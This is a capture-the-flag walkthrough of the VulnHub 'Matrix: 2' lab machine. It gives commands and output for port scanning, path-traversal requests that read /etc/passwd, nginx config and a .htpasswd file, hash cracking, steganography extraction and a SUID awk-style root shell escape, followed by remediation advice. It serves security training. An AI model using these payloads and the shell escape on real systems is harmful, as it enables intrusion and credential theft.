@@ -1,0 +1,413 @@
+================================================================================
+Matrix: 2 CTF - Technical Solution Guide
+https://www.vulnhub.com/entry/matrix-2,279/
+================================================================================
+
+OBJECTIVE  : Get root and read /root/flag.txt
+DIFFICULTY : Intermediate
+KEYWORDS   : Full Port Scan, LFI, Hash Cracking, Steganography, GTFOBins (morpheus/awk)
+TARGET IP  : 10.0.2.25
+
+================================================================================
+[1] RECONNAISSANCE
+================================================================================
+
+# Full-range port scan — essential; services run on high, non-standard ports
+nmap -sV -sC -Pn -p- 10.0.2.25
+
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-17 13:31 -0400
+Nmap scan report for 10.0.2.25
+Host is up (0.000077s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT      STATE SERVICE         VERSION
+80/tcp    open  http            nginx 1.10.3
+|_http-title: Welcome in Matrix v2 Neo
+1337/tcp  open  ssl/http        nginx
+|_http-title: 401 Authorization Required
+| http-auth:
+|_  Basic realm=Welcome to Matrix 2
+12320/tcp open  ssl/http        ShellInABox
+|_http-title: Shell In A Box
+12321/tcp open  ssl/warehouse-sss?
+12322/tcp open  ssl/http        nginx
+| http-robots.txt: 1 disallowed entry
+|_file_view.php
+|_http-title: Welcome in Matrix v2 Neo
+MAC Address: 08:00:27:23:53:CD (Oracle VirtualBox virtual NIC)
+
+# Key observations:
+# - Port 80  : Static nginx landing page — nothing useful
+# - Port 1337: SSL nginx — immediately requires HTTP Basic Auth
+# - Port 12320: Shell In A Box (browser-based terminal) — login target
+# - Port 12321: SSL, nothing interesting
+# - Port 12322: SSL nginx — robots.txt present, most useful enumeration target
+
+================================================================================
+[2] WEB ENUMERATION — PORT 12322
+================================================================================
+
+# robots.txt on port 80 returns 404 — only port 12322 has one:
+curl -k https://10.0.2.25:12322/robots.txt
+
+User-agent: *
+Disallow: file_view.php
+
+# robots.txt reveals a hidden endpoint. Fetching it directly:
+curl -k https://10.0.2.25:12322/file_view.php
+
+<!-- Error file parameter missing..!!! -->
+
+# The error confirms a file parameter is expected — classic LFI setup.
+
+================================================================================
+[3] LOCAL FILE INCLUSION (LFI)
+================================================================================
+
+# Confirm LFI by reading /etc/passwd:
+curl -k https://10.0.2.25:12322/file_view.php -d "file=../../../../../etc/passwd"
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+[...]
+mysql:x:105:107:MySQL Server,,,:/nonexistent:/bin/false
+shellinabox:x:107:109:Shell In A Box,,,:/var/lib/shellinabox:/bin/false
+n30:x:1000:1000:Neo,,,:/home/n30:/bin/bash
+testuser:x:1001:1001::/home/testuser:
+
+# Key account: n30 (Neo) — valid login shell at /bin/bash
+
+# Read nginx virtual host config to find where port 1337's auth file lives:
+curl -k https://10.0.2.25:12322/file_view.php \
+  -d "file=../../../../../etc/nginx/sites-enabled/default"
+
+server {
+    listen 1337 ssl;
+    root /var/www/;
+    index index.html index.php;
+
+    auth_basic "Welcome to Matrix 2";
+    auth_basic_user_file /var/www/p4ss/.htpasswd;   <- credential file path
+    ...
+}
+
+# Read the .htpasswd file directly via LFI:
+curl -k https://10.0.2.25:12322/file_view.php \
+  -d "file=../../../../../var/www/p4ss/.htpasswd"
+
+Tr1n17y:$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0
+
+# Apache MD5 ($apr1$) hash found for user Tr1n17y (Trinity)
+
+================================================================================
+[4] HASH CRACKING — JOHN THE RIPPER
+================================================================================
+
+echo 'Tr1n17y:$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0' > hash
+
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+Warning: detected hash type "md5crypt", but the string is also recognized
+as "md5crypt-long"
+Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 256/256 AVX2 8x3])
+Will run 6 OpenMP threads
+admin            (Tr1n17y)
+1g 0:00:00:00 DONE (2026-05-17 15:06)
+Session completed.
+
+# Confirmed credentials for port 1337:
+#   Username : Tr1n17y
+#   Password : admin
+
+================================================================================
+[5] AUTHENTICATED ENUMERATION — PORT 1337
+================================================================================
+
+# Log into https://10.0.2.25:1337 with Tr1n17y:admin
+# Inspect page source — reveals a commented-out image tag:
+
+<!--img src="h1dd3n.jpg"-->
+
+# Download the image:
+curl -k -u Tr1n17y:admin https://10.0.2.25:1337/h1dd3n.jpg -O
+
+================================================================================
+[6] STEGANOGRAPHY — STEGHIDE
+================================================================================
+
+# The filename "h1dd3n" (hidden) signals steganography.
+# The username n30 found in /etc/passwd is the natural passphrase candidate.
+
+steghide extract -sf h1dd3n.jpg -p n30
+
+wrote extracted data to "n30.txt".
+
+cat n30.txt
+
+P4$$w0rd
+
+# Credentials found:
+#   Username : n30
+#   Password : P4$$w0rd
+
+================================================================================
+[7] INITIAL ACCESS — SHELL IN A BOX
+================================================================================
+
+# Log into Shell In A Box at https://10.0.2.25:12320 with n30:P4$$w0rd
+
+n30@Matrix_2 ~$ whoami
+n30
+
+n30@Matrix_2 ~$ ls -la
+total 36
+drwxr-xr-x 5 n30  n30  4096 Dec  8  2018 .
+drwxr-xr-x 3 root root 4096 Dec  7  2018 ..
+-rw------- 1 n30  n30   950 Dec 13  2018 .bash_history
+-rw-r--r-- 1 n30  n30   220 Dec  7  2018 .bash_logout
+-rw-r--r-- 1 n30  n30  2083 Dec  7  2018 .bashrc
+drwxr-xr-x 2 n30  n30  4096 Dec  7  2018 .bashrc.d
+-rw-r--r-- 1 n30  n30     0 Dec  8  2018 .penv
+-rw-r--r-- 1 n30  n30   746 Dec  7  2018 .profile
+drwxr-xr-x 2 n30  n30  4096 Dec  7  2018 .profile.d
+drwx------ 2 n30  n30  4096 Dec  7  2018 .ssh
+
+n30@Matrix_2 ~$ sudo -l
+-bash: sudo: command not found
+
+# sudo unavailable. Inspect .bash_history for privilege escalation clues:
+
+n30@Matrix_2 ~$ cat .bash_history
+
+morpheus 'BEGIN {system("/bin/sh")}'
+ls -l /usr/bin/morpheus
+chown n30:n30 /usr/bin/morpheus
+chmod 550 /usr/bin/morpheus
+chown root /usr/bin/morpheus
+morpheus 'BEGIN {system("/bin/sh")}'
+[...]
+
+# The awk-style syntax BEGIN {system(...)} and the binary named "morpheus"
+# make the exploit vector immediately clear.
+
+================================================================================
+[8] PRIVILEGE ESCALATION — morpheus (awk GTFOBins)
+================================================================================
+
+# morpheus is a SUID binary owned by root that behaves like awk.
+# The awk GTFOBins technique spawns a shell via BEGIN {system()}.
+
+n30@Matrix_2 ~$ morpheus 'BEGIN {system("/bin/sh")}'
+
+# whoami
+root
+
+# pwd
+/home/n30
+
+# cd /root
+# ls
+flag.txt
+
+================================================================================
+[9] ROOT FLAG
+================================================================================
+
+# cat flag.txt
+
+YOURE FASTER THAN THIS.
+DONT THINK YOU ARE,
+KNOW YOU ARE.
+-MORPHEUS
+AKA
+UNKNOWNDEVICE64
+
+# ROOT FLAG CAPTURED
+
+================================================================================
+[10] ATTACK CHAIN SUMMARY
+================================================================================
+
+Nmap Full Port Scan (-p-) → Ports 80, 1337, 12320, 12321, 12322
+    |
+    v
+Port 12322 — robots.txt discloses file_view.php
+    |
+    v
+LFI via file_view.php → /etc/passwd (finds user n30)
+    |
+    v
+LFI → nginx sites-enabled/default → .htpasswd path: /var/www/p4ss/.htpasswd
+    |
+    v
+LFI → /var/www/p4ss/.htpasswd → Tr1n17y:$apr1$7tu4e5pd$hwluCxFYqn/IHVFcQ2wER0
+    |
+    v
+John the Ripper + rockyou.txt → Tr1n17y:admin
+    |
+    v
+Login to port 1337 → Page source: <!--img src="h1dd3n.jpg"-->
+    |
+    v
+Download h1dd3n.jpg
+    |
+    v
+steghide extract -sf h1dd3n.jpg -p n30 → P4$$w0rd
+    |
+    v
+Login to Shell In A Box (port 12320) → n30:P4$$w0rd
+    |
+    v
+cat .bash_history → morpheus binary + awk-style exploit visible
+    |
+    v
+morpheus 'BEGIN {system("/bin/sh")}' → Root Shell
+    |
+    v
+cat /root/flag.txt — SYSTEM PWNED
+
+================================================================================
+[11] VULNERABILITIES IDENTIFIED
+================================================================================
+
+1. UNAUTHENTICATED LOCAL FILE INCLUSION — file_view.php (Critical)
+   Detail   : file_view.php on port 12322 passes the user-supplied `file`
+              parameter directly to a file-reading function with no
+              authentication, path sanitisation, or allowlist check.
+   Impact   : Arbitrary file disclosure; reads /etc/passwd, nginx config,
+              and .htpasswd. In more complex scenarios, LFI can chain into
+              RCE via log poisoning or /proc/self/environ injection.
+   Fix      : Validate and restrict the file parameter to an explicit
+              allowlist; move sensitive files outside the web root; require
+              authentication on all service endpoints.
+
+2. SENSITIVE CREDENTIAL FILE READABLE VIA LFI (High)
+   Detail   : The nginx virtual host for port 1337 stored its .htpasswd
+              file at /var/www/p4ss/.htpasswd — inside the web server's
+              readable path — allowing LFI to extract it directly.
+   Impact   : Hashed credentials exposed; cracked in under one second.
+   Fix      : Store credential files outside the web root; remediate the
+              LFI vulnerability; enforce strong, unique passwords.
+
+3. WEAK PASSWORD — APACHE MD5 HASH (High)
+   Detail   : The password for Tr1n17y was "admin" — present near the top
+              of the rockyou wordlist. The $apr1$ hash format is also
+              computationally weak by modern standards.
+   Impact   : Cracked instantly by John the Ripper.
+   Fix      : Enforce strong password policy; consider bcrypt or Argon2
+              for password hashing; disable HTTP Basic Auth in favour of
+              token-based authentication.
+
+4. CREDENTIALS HIDDEN VIA STEGANOGRAPHY (High)
+   Detail   : The system password for n30 (P4$$w0rd) was concealed inside
+              h1dd3n.jpg using Steghide, served from an authenticated but
+              otherwise unprotected HTTP endpoint.
+   Impact   : Any attacker who obtained Trinity's credentials could
+              retrieve and extract the image to escalate further.
+   Fix      : Never store credentials in steganographic or encoded form
+              on the server. Obfuscation is not encryption.
+
+5. SUID BINARY WITH ARBITRARY CODE EXECUTION — morpheus (Critical)
+   Detail   : /usr/bin/morpheus is a SUID root binary with awk-like
+              behaviour. Passing 'BEGIN {system("/bin/sh")}' spawns a root
+              shell — identical to the GTFOBins technique for awk.
+   Impact   : Any user with execute permission on morpheus gains an
+              immediate, unrestricted root shell.
+   Fix      : Remove SUID bit: chmod u-s /usr/bin/morpheus
+              Audit all SUID binaries: find / -perm -4000 -type f 2>/dev/null
+              Never set SUID on interpreter-style or shell-spawning binaries.
+
+================================================================================
+[12] SECURITY RECOMMENDATIONS
+================================================================================
+
+1. Web Application Security
+   - Validate and allowlist all user-supplied file paths; never pass raw
+     input to file-reading functions
+   - Require authentication on every service endpoint regardless of content
+   - Store configuration files and credential stores outside the web root
+   - Conduct regular web application penetration tests and code reviews
+
+2. Credential & Secrets Management
+   - Enforce strong, randomly generated passwords on all accounts
+   - Use modern hashing algorithms (bcrypt, Argon2) instead of $apr1$ MD5
+   - Never store credentials — even encoded or steganographically concealed —
+     on the server
+   - Use a dedicated secrets manager (e.g. HashiCorp Vault) for sensitive
+     material
+
+3. SUID Binary Hardening
+   - Regularly audit SUID/SGID binaries:
+       find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
+   - Remove SUID from any binary capable of executing arbitrary commands
+   - Prefer Linux capabilities (setcap) over SUID where possible
+   - Check all custom and third-party binaries against GTFOBins before
+     deployment: https://gtfobins.github.io/
+
+4. Network & Service Hardening
+   - Restrict access to high-numbered service ports via firewall rules or VPN
+   - Enable fail2ban or equivalent on all externally reachable services
+   - Centralise logging (nginx access/error, auth events, shell activity)
+     and alert on anomalous patterns
+
+================================================================================
+[13] TOOLS USED
+================================================================================
+
+Reconnaissance:
+  nmap       - Full-range port and service scanning (-p-)
+
+Enumeration:
+  curl       - HTTP/HTTPS file retrieval and LFI exploitation
+
+Credential Attacks:
+  john       - Apache MD5 ($apr1$) hash cracking
+  rockyou.txt - Password wordlist
+
+Steganography:
+  steghide   - Hidden data extraction from JPEG (steghide extract)
+
+Exploitation:
+  morpheus   - SUID awk-like binary; GTFOBins shell escape
+               via 'BEGIN {system("/bin/sh")}'
+
+Access:
+  Shell In A Box - Browser-based terminal login (port 12320)
+
+References:
+  GTFOBins awk : https://gtfobins.github.io/gtfobins/awk/
+  Shell In A Box: https://github.com/shellinabox/shellinabox
+  Steghide      : http://steghide.sourceforge.net/
+
+================================================================================
+[14] REFERENCES
+================================================================================
+
+VulnHub:
+  Matrix: 2 VM : https://www.vulnhub.com/entry/matrix-2,279/
+
+GTFOBins awk:
+  https://gtfobins.github.io/gtfobins/awk/
+
+Shell In A Box:
+  https://github.com/shellinabox/shellinabox
+
+Steghide:
+  http://steghide.sourceforge.net/
+
+John the Ripper:
+  https://www.openwall.com/john/
+
+================================================================================
+[15] DISCLAIMER
+================================================================================
+
+This writeup is for educational and training purposes only. All techniques
+demonstrated should only be used on systems you own or have explicit written
+permission to test. Unauthorized access to computer systems is illegal and
+may result in criminal prosecution.
+
+The author and VulnHub are not responsible for any misuse of the information
+provided in this writeup. This content is intended to help security
+professionals learn and practice ethical hacking in controlled environments.
+
+================================================================================
